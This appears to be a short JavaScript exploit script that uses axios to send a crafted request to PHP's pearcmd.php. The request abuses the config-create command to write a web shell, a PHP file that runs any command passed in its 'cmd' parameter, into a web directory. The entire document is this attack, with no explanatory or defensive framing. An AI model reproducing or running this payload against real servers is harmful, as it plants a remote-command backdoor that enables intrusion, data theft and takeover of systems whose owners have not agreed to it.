import axios from "axios";

const target = "/usr/share/php/pearcmd.php?+config-create+/usr/share/php/+<?php system($_GET['cmd']); ?>+/var/wwwroot/shell.php";
axios.get(target);
